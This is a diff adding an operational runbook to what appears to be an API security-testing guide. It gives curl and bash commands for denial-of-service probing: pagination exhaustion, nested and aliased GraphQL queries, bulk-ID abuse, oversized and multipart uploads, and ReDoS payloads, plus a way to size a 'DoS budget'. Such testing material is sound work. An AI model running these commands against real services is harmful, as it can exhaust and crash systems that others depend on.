@@ -155,6 +155,86 @@ curl -G -H "$AUTH" "https://api.target/admin/search" \
 # super-linearly.
 ```
 
+## Operational Runbook
+
+For each candidate endpoint, the canonical confirmation sequence is: baseline → pathological → measurement.
+
+### Step 1 — pagination DoS
+
+```bash
+# Baseline — small page
+time curl -s "<TARGET>/api/items?page=1&size=20" > /dev/null
+
+# Pathological — max page size + max page number
+time curl -s "<TARGET>/api/items?page=999999&size=10000" > /dev/null
+
+# Per-page comparison — does response time scale linearly or faster?
+for size in 10 100 1000 10000 100000; do
+  t=$(curl -s -o /dev/null -w '%{time_total}' "<TARGET>/api/items?size=$size")
+  echo "size=$size → ${t}s"
+done
+```
+
+If a single request takes >5s or runs the server out of memory → critical resource exhaustion.
+
+### Step 2 — query-complexity (GraphQL)
+
+```bash
+# Deeply-nested query that explodes on every level
+QUERY='{ users { friends { friends { friends { friends { id email } } } } } }'
+time curl -s -X POST '<TARGET>/graphql' \
+    -H 'Content-Type: application/json' \
+    -d "{\"query\":\"$QUERY\"}" > /dev/null
+
+# Field-aliasing amplification — same query 100 times in one packet
+ALIASES=$(for i in $(seq 1 100); do echo "a${i}: user(id: 1) { id }"; done | tr '\n' ' ')
+curl -s -X POST '<TARGET>/graphql' -d "{\"query\":\"{ $ALIASES }\"}"
+```
+
+### Step 3 — batch / bulk-endpoint abuse
+
+```bash
+# How many IDs does the endpoint accept in one call?
+for n in 10 100 1000 10000; do
+  ids=$(seq 1 $n | tr '\n' ',' | sed 's/,$//')
+  t=$(curl -s -o /dev/null -w '%{time_total}' "<TARGET>/api/users/bulk?ids=$ids")
+  echo "n=$n → ${t}s"
+done
+```
+
+A bulk endpoint without an explicit `len(ids) <= N` check is a target.
+
+### Step 4 — file-upload size + cost
+
+```bash
+# How big a file is accepted? Try 100MB, 1GB, 10GB (test with stream)
+yes "x" | head -c 100M | curl -s -F "file=@-" '<TARGET>/upload' -o /dev/null -w 'status=%{http_code} t=%{time_total}\n'
+
+# Multipart explosion — many tiny files in one request
+for i in $(seq 1 1000); do echo "--XX"; echo "Content-Disposition: form-data; name=f$i"; echo; echo "x"; done > /tmp/multipart.txt
+curl -s -X POST '<TARGET>/upload' -H 'Content-Type: multipart/form-data; boundary=XX' --data-binary @/tmp/multipart.txt
+```
+
+### Step 5 — regex DoS (ReDoS)
+
+```bash
+# Catastrophic backtracking — exponential-time patterns
+for n in 10 15 20 25 30; do
+  payload=$(python3 -c "print('a' * $n + '!')")
+  t=$(curl -s -o /dev/null -w '%{time_total}' --data-urlencode "q=$payload" '<TARGET>/search')
+  echo "n=$n → ${t}s"
+done
+# If t grows super-linearly with n → ReDoS confirmed.
+```
+
+### Step 6 — quantify impact
+
+For each confirmed vector, record:
+- Single-request resource cost (CPU seconds, response time, response bytes)
+- Multiplier for concurrent / repeated requests (1 req = X server-CPU-s; sustained M req/s = X×M load)
+- Concrete DoS budget: "10 requests/min from one IP = full server CPU"
+- Severity: **high** for sustained service degradation; **critical** when a small budget reliably crashes a process.
+
 ## Verification
 
 Quantify:
